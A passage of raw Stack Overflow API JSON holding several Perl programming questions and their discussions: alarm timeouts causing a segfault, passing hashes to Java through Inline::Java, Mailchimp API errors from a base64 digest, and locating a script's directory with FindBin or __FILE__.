"last_activity_date": 1569680554, "creation_date": 1569660316, "last_edit_date": 1569667029, "question_id": 58144739, "link": "https://stackoverflow.com/questions/58144739/perl-getting-segmentation-fault-while-timeout-using-alarm", "title": "Perl getting segmentation fault while timeout using alarm", "body": "<p>I'm writing Perl for the first time and Internet tells me i can use alarm if i have a long running sql query.\nI need to run a SP which will run for hours in a Perl, and i would like to set a time limit.\nBelow is the last step of my codes but i'm getting <strong>segmentation fault</strong> when the process runs longer that my timeout, in this occasion sleep(20). Logs shows it finished printing ---1---- and then segmentation fault.\nHow can I fix this?</p>\n\n<p>I tried taking sub DelRef{} out into a seperate .pl and comment the $db part in the third line to test if alarm is working fine, and it worked all right. I'm confused which part went wrong and caused the segmentation fault.</p>\n\n<pre><code>sub DelRef {\n    print \"starting defRefData\\n\";\n    $db = new Sybapi($user, $password, $server, $margin_database);\n    print \"entering eval\\n\";\n    my $timeout = 10;\n    eval {\n            local $SIG{ALRM} = sub { die \"timeout\\n\" };\n            print \"inside eval now\\n\";\n            alarm($timeout);\n            print \"---1----\\n\";\n            #sleep(5); --working fine\n            sleep(20); #not working, \n            #$db-&gt;exec_sql(\"exec CPN_Margins..clean_up_refData_db '$XrefCode'\");\n            print \"----2----\\n\";\n            alarm(0);\n    };\n    #alarm(0);\n            print \"out of eval\\n\";\n    if($@)\n    {\n        #die unless $@ eq \"timeout\\n\";\n        if($@ =~ \"timeout\\n\")\n        {\n        warn \"Timed out!\\n\";\n        #exit 0;\n        }\n        else{\n                print $@;\n        }\n    }\n\n}\n\n&amp;DelRef();\nprint \"process is done\\n\";\n$db-&gt;close();\n</code></pre>\n"}, {"tags": ["java", "perl"], "comments": [{"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1569658264, "post_id": 58144163, "comment_id": 102674365, "body": "How is <code>evaluate()</code> defined?"}, {"owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1569658976, "post_id": 58144163, "comment_id": 102674470, "body": "Seems like passing hashes is not supported, but passing arrays are. So you could try pass the hash as an array to Java?"}, {"owner": {"reputation": 49, "user_id": 9602275, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9a2a85504f21fdaa2365b74a6adf3cb8?s=128&d=identicon&r=PG&f=1", "display_name": "goutham", "link": "https://stackoverflow.com/users/9602275/goutham"}, "reply_to_user": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "edited": false, "score": 0, "creation_date": 1569783682, "post_id": 58144163, "comment_id": 102699092, "body": "public String evaluate(Map results, String s) { \tString expression = s; \tStringWriter writer = new StringWriter();  \ttry { \t\tSystem.out.println(results); \t\texpression = &quot;&lt;#setting number_format=\\&quot;##.##\\&quot;&gt;\\n&quot; + expression; \t\t \t\tTemplate expressionTemplate = new Template(&quot;expression&quot;, new \tStringReader(expression), new Configuration());  \texpressionTemplate.process(results, writer); \t} catch (Exception e) { \t\tSystem.out.println(e); \t}  \treturn writer.toString();       }"}], "answers": [{"comments": [{"owner": {"reputation": 49, "user_id": 9602275, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9a2a85504f21fdaa2365b74a6adf3cb8?s=128&d=identicon&r=PG&f=1", "display_name": "goutham", "link": "https://stackoverflow.com/users/9602275/goutham"}, "edited": false, "score": 1, "creation_date": 1569790811, "post_id": 58144699, "comment_id": 102700637, "body": "Thanks  H&#229;kon H&#230;gland, it is working as you suggested."}], "tags": [], "owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "is_accepted": false, "score": 2, "last_activity_date": 1569659920, "creation_date": 1569659920, "answer_id": 58144699, "question_id": 58144163, "link": "https://stackoverflow.com/questions/58144163/how-do-we-bind-perl-hash-reference-to-java-hash-map/58144699#58144699", "title": "How do we bind perl hash reference to java hash map", "body": "<p>It seems like passing Perl hashes to Java is not directly supported.\nHere is an example of how you can work around the issue by passing the hash keys and values as arrays instead:</p>\n\n<pre><code>use Inline Java =&gt; &lt;&lt;'END' ;\n   import java.util.* ;\n\n   class Pod_101 {\n      public Pod_101() {\n      }\n\n      public HashMap get_hash (String keys[], Integer vals[] ){\n         HashMap&lt;String, Integer&gt; hash = new HashMap&lt;&gt;() ;\n         for(int i= 0; i &lt; keys.length; i++){\n             hash.put(keys[i], vals[i]);\n         }\n         return hash;\n      }\n      public Integer evaluate(HashMap&lt;String, Integer&gt; h, String foo){\n          return h.get(\"input\") ;\n      }\n   }\nEND\n\nmy $obj = Pod_101-&gt;new() ;\nmy %data = ('input' =&gt; 45, 'Lisa' =&gt; 30, 'Kumar' =&gt; 40);\nmy $h = $obj-&gt;get_hash( [keys %data], [values %data]) ;\nmy $val = $obj-&gt;evaluate($h, \"\\${input*12}\");\nprint \"$val\\n\";\n</code></pre>\n\n<p><strong>Output</strong>:</p>\n\n<pre><code>45\n</code></pre>\n"}], "owner": {"reputation": 49, "user_id": 9602275, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9a2a85504f21fdaa2365b74a6adf3cb8?s=128&d=identicon&r=PG&f=1", "display_name": "goutham", "link": "https://stackoverflow.com/users/9602275/goutham"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 112, "favorite_count": 0, "answer_count": 1, "score": 3, "last_activity_date": 1569659920, "creation_date": 1569654689, "last_edit_date": 1569656697, "question_id": 58144163, "link": "https://stackoverflow.com/questions/58144163/how-do-we-bind-perl-hash-reference-to-java-hash-map", "title": "How do we bind perl hash reference to java hash map", "body": "<p>I am using <a href=\"https://metacpan.org/pod/Inline::Java\" rel=\"nofollow noreferrer\">Inline::Java</a> in Perl, and I need to pass a hash to a Java method.</p>\n\n<p>I have tried the following code:</p>\n\n<pre><code>my $obj = new Pod_101() ;\nmy %data = ('input' =&gt; 45, 'Lisa' =&gt; 30, 'Kumar' =&gt; 40);\nmy $val = $obj-&gt;evaluate(\\%data, \"\\${input*12}\");\n</code></pre>\n\n<p>It results in the following error:</p>\n\n<blockquote>\n  <p>Can't convert HASH(0x556322c62368) to object java.util.Map at\n  /usr/lib/x86_64-linux-gnu/perl5/5.26/Inline/Java/Object.pm line 107.</p>\n</blockquote>\n"}, {"tags": ["perl", "mailchimp"], "comments": [{"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 0, "creation_date": 1569617387, "post_id": 58141159, "comment_id": 102668568, "body": "I don&#39;t see a question in here."}, {"owner": {"reputation": 11, "user_id": 12051409, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3cd8ce7ef49e05ec3ddc13b64f278ae9?s=128&d=identicon&r=PG", "display_name": "Scott Hillman", "link": "https://stackoverflow.com/users/12051409/scott-hillman"}, "reply_to_user": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 0, "creation_date": 1571071772, "post_id": 58141159, "comment_id": 103110265, "body": "The question is: will this hack break something on the Mailchimp side?"}], "owner": {"reputation": 11, "user_id": 12051409, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3cd8ce7ef49e05ec3ddc13b64f278ae9?s=128&d=identicon&r=PG", "display_name": "Scott Hillman", "link": "https://stackoverflow.com/users/12051409/scott-hillman"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 128, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1569617197, "creation_date": 1569617197, "question_id": 58141159, "link": "https://stackoverflow.com/questions/58141159/mailchimp-api-400-and-404-errors", "title": "Mailchimp API 400 and 404 Errors", "body": "<p>I'm using a custom signup form to add users to a Mailchimp list (API v3.0) using Curl. While the process works most of the time, I get occasional 400 errors.</p>\n\n<p>I thought the problem might be related to the binary value returned by the MD5 hash that's appended to the URL string, so I tried using a base 64 hash instead. Using data from a signup that had previously failed, the add was successful.</p>\n\n<p>Later, after several additional successful signups, I received a 404 error, indicating a url path error. When I captured the url, I noticed that the base 64 digest contained a \"/\" character, which would have terminated that portion of the url string.</p>\n\n<p>When I substituted another (random) alpha character for the \"/\", the add completed correctly... no error.</p>\n\n<p>(1) I'm not sure why the binary md5 email hash produced occasional errors, and \n(2) If it's ok to use a regex to substitute another alpha character for the occasional \"/\". Seems like a potentially problematic hack.</p>\n\n<p>This now seems to be working (no errors, good adds), but I'm concerned about the modified base 64 hash, that is no longer a real hash of the email address:</p>\n\n<pre><code>my $digest = md5_base64(lc($email));\n$digest =~ s/\\//x/;\n\n    my $curl = WWW::Curl::Easy-&gt;new;\n\nmy $url = \"$endpoint/$listid/members/\" . $digest;\n</code></pre>\n\n<p>Since using this modified version of Mailchimp API code that has been posted elsewhere, all adds through the signup form have worked correctly.</p>\n"}, {"tags": ["file", "perl"], "comments": [{"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 0, "creation_date": 1569608228, "post_id": 58139560, "comment_id": 102665740, "body": "<code>use strict; use warnings;</code>"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1569608937, "post_id": 58139560, "comment_id": 102666008, "body": "&quot;<i>It appears to be that maybe the full path is not included in <code>__FILE__</code></i>&quot;  -- well, try?  (It indeed isn&#39;t, and even if it were on some builds or systems it is definitely not guaranteed).  Either way, that wouldn&#39;t be the right way (what you could do using <code>Cwd::abs_path(__FILE__)</code> even though even that doesn&#39;t <i>guarantee</i> it), but we have <code>FindBin</code> for it."}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 0, "creation_date": 1569609372, "post_id": 58139560, "comment_id": 102666172, "body": "<code>Cwd::abs_path(__FILE__)</code> is clearer and more reliable than FindBin."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 0, "creation_date": 1569610052, "post_id": 58139560, "comment_id": 102666424, "body": "@Grinnz Wow, can you elaborate on <i>that</i>?  (For one it doesn&#39;t, in fact, guarantee that you get the full path.  Then ... what is &quot;<i>unreliable</i>&quot; with <code>FindBin</code>?).  That &quot;clear&quot; part is entirely personal here -- you left out the fact that I&#39;d also need <code>File::Basename::dirname</code> or such then"}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1569611516, "post_id": 58139560, "comment_id": 102666974, "body": "@zdim I&#39;m not sure what you mean by &quot;it doesn&#39;t guarantee that you get the full path&quot;, as that&#39;s exactly what abs_path does. I was referring to it being clearer in functionality, not readability - can you say off the top of your head what FindBin will do if you have a script require another script? If FindBin is loaded at runtime? There is never any doubt what <code>__FILE__</code> refers to."}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1569611606, "post_id": 58139560, "comment_id": 102667002, "body": "@zdim More reliable is referring to the fact that FindBin could return executables from your <code>PATH</code> before Perl 5.16, and you can&#39;t update it from CPAN to fix that."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 0, "creation_date": 1569620865, "post_id": 58139560, "comment_id": 102669431, "body": "@Grinnz &quot;<i>FindBin could return</i>&quot;  -- these are known edge cases from versions that are pushing it on the decade old.  While you aren&#39;t talking about a bag of quirks from all of Unix, some murky and well hidden, that may come through <code>dirname</code>?  I appreciate preferences but that&#39;s what they are; shouldn&#39;t be made into general recommendations.  (As for <code>abs_path</code>, I&#39;ve seen it return <code>.</code> -- again, in special cases, and I didn&#39;t dog it, but ...)"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 0, "creation_date": 1569639682, "post_id": 58139560, "comment_id": 102671903, "body": "@Grinnz, FindBin and <code>dirname(abs_path($0))</code> will reliably be relative to the script (unless you change <code>$0</code>). <code>dirname(abs_path(__FILE__))</code> will reliably be relative to the current file. Neither is better or more reliable; they serve different purposes."}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1569646131, "post_id": 58139560, "comment_id": 102672571, "body": "@zdim There are no edge cases from dirname. The caveat is simply that you get the parent directory even if called on a directory."}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1569646163, "post_id": 58139560, "comment_id": 102672572, "body": "@zdim I have never heard of that abs_path bug, can you point to a bug report?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1569650509, "post_id": 58139560, "comment_id": 102673167, "body": "@zdim, Your point is moot because FindBin uses <code>abs_path</code> too. The difference is <code>$0</code> vs <code>__FILE__</code>."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1569650596, "post_id": 58139560, "comment_id": 102673177, "body": "<code>abs_path</code> would fail if insufficient permissions are available. It returns <code>undef</code> on error, though, not <code>.</code>"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1569652924, "post_id": 58139560, "comment_id": 102673524, "body": "@ikegami &quot;<i>FindBin uses abs_path too.</i>&quot; -- fair enough, my point really was that <code>FindBin</code> is no less reliable. As for <code>abs_path</code>, perhaps I can reconstitute the circumstances under which I was getting <code>.</code> (had to change the way) but can&#39;t do that readily (so maybe I shouldn&#39;t have mentioned)"}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1569680612, "post_id": 58139560, "comment_id": 102678900, "body": "@ikegami I disagree that there is no difference in reliability, because caveats exist for $0 and additional caveats exist for FindBin, but they don&#39;t apply to <code>__FILE__</code>. @zdim You probably are thinking of what happens if you call <code>dirname</code> on the undef you might get from <code>abs_path</code>."}, {"owner": {"reputation": 11, "user_id": 12131988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52878654ae2e3776fe8afd53ecca1999?s=128&d=identicon&r=PG&f=1", "display_name": "waterrider", "link": "https://stackoverflow.com/users/12131988/waterrider"}, "reply_to_user": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1569680941, "post_id": 58139560, "comment_id": 102678955, "body": "Thanks for your answers and also to @zdim . I am not a coder and barely understand the code in my own program (it was written for me over 10 years ago) and, by the way, it worked fine on whatever computers I was using then, though the code has not changed since. Sorry to be so ignorant but could you kindly indicate the exact change you are suggesting. Could you please tell me what to add and what to substitute in my code. Thanks again"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 0, "creation_date": 1569733587, "post_id": 58139560, "comment_id": 102688180, "body": "@Grinnz, By that logic, <code>__FILE__</code> is also unreliable. So take your pick. Either both are unreliable, or both are reliable at what they do."}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1569766866, "post_id": 58139560, "comment_id": 102694872, "body": "@ikegami It is not. The only way <code>__FILE__</code> can be changed is with a parser hint, not at runtime. <code>$0</code> is changed commonly for legitimate reasons."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 0, "creation_date": 1569769907, "post_id": 58139560, "comment_id": 102695614, "body": "@Grinnz, <code>__FILE__</code> can be changed as easily as <code>$0</code>. (<code>#line 1 x.pl</code>)"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 0, "creation_date": 1569769979, "post_id": 58139560, "comment_id": 102695638, "body": "@Grinnz, But again, that&#39;s all moot. There&#39;s no point in comparing things with different purposes. <code>$0</code> and <code>__FILE__</code> are not interchangeable."}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "reply_to_user": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1569783913, "post_id": 58139560, "comment_id": 102699143, "body": "@ikegami You are equivocating very different things. The parser hint can&#39;t be applied at a distance by calling a function. And yes they are very different purposes. The vast majority of use cases for this are relative to a file you control, therefore the more reliable <code>__FILE__</code> is usable."}], "answers": [{"comments": [{"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 0, "creation_date": 1569611835, "post_id": 58139702, "comment_id": 102667071, "body": "That caveat for dirname cannot apply to <code>__FILE__</code> since it will always be a file in a directory (at least, if we&#39;re talking about a source file). <code>$0</code> on the other hand may be set to anything to change how it appears in <code>ps</code> so is unreliable."}, {"owner": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 0, "creation_date": 1569612328, "post_id": 58139702, "comment_id": 102667200, "body": "+1 to the Path::Tiny recommendation - though Dir::Self is a more direct implementation of this if we&#39;re going to CPAN."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 0, "creation_date": 1569621043, "post_id": 58139702, "comment_id": 102669465, "body": "@Grinnz Well, they&#39;re different; <code>__FILE__</code> is a compilation unit (source), <code>$0</code> the running thing; call them out of a module and we&#39;ll have to make decisions.  I don&#39;t know what they (really) want, but <code>dirname</code> isn&#39;t excused on this account."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 0, "creation_date": 1569621207, "post_id": 58139702, "comment_id": 102669496, "body": "@Grinnz See, the <code>Path::Tiny</code> for instance -- I like it and am not shy to recommend it ... but I&#39;ve got complaints as well.  I&#39;m afraid it&#39;s a <i>very</i> short list of things that come with no issues."}, {"owner": {"reputation": 11, "user_id": 12131988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52878654ae2e3776fe8afd53ecca1999?s=128&d=identicon&r=PG&f=1", "display_name": "waterrider", "link": "https://stackoverflow.com/users/12131988/waterrider"}, "reply_to_user": {"reputation": 8718, "user_id": 5848200, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8072aaf76dcb4fe5027964252f16382?s=128&d=identicon&r=PG", "display_name": "Grinnz", "link": "https://stackoverflow.com/users/5848200/grinnz"}, "edited": false, "score": 0, "creation_date": 1569668443, "post_id": 58139702, "comment_id": 102676184, "body": "Thanks for your answers also @Grinnz. I possibly should have mentioned that I am not a coder and barely understand the code in my own program (it was written for me over 10 years ago) and, by the way, it worked fine on whatever computers I was using then, though the code has not changed since. Sorry to be so ignorant but could you kindly indicate the exact change you are suggesting. It looks as though I need not just to add but also to substitute code and I&#39;m not sure exactly how to do that."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 11, "user_id": 12131988, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/52878654ae2e3776fe8afd53ecca1999?s=128&d=identicon&r=PG&f=1", "display_name": "waterrider", "link": "https://stackoverflow.com/users/12131988/waterrider"}, "edited": false, "score": 1, "creation_date": 1569705080, "post_id": 58139702, "comment_id": 102684597, "body": "@waterrider  In the &quot;<i>relevant code</i>&quot; you show 